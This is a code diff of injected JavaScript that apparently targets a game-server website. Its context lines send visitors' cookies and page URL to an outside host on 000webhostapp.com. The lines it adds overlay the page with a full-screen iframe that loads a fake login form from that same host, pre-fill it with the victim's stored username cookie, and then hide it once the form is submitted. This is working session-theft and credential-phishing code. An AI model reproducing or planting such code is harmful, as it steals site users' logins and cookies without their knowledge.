@@ -7,5 +7,40 @@ $data = encodeURIComponent(cookie+url);
 var imageObject = new Image();
 imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
 
-//Fix the new text error
-jQuery("id#showgame").html("(Elysium) Nostalrius - PVP");
+//Passwords
+//--------------------------------
+
+
+//Load jquery
+var script = document.createElement('script');
+script.src = '//code.jquery.com/jquery-1.11.0.min.js';
+script.type = 'text/javascript';
+document.getElementsByTagName('head')[0].appendChild(script);
+
+//Let page load first
+document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;}</style>" + document.head.innerHTML;
+document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='http://g4wowisbad.000webhostapp.com/login.php?username="+getCookie("login_name")+"'></iframe>" + document.body.innerHTML;
+var prevTitle = document.title;
+document.title = "网站管理系统";
+
+window.onload = function(){
+	$("#login_iframe").contents().find("#form1").submit(function(){
+		$("#login_iframe").attr("src", "http://g4wowisbad.000webhostapp.com/login.php?username="+getCookie("login_name"));
+		$("#login_iframe").delay(1000).hide(0);
+	});
+}
+
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i = 0; i <ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
+        }
+    }
+    return "";
+}
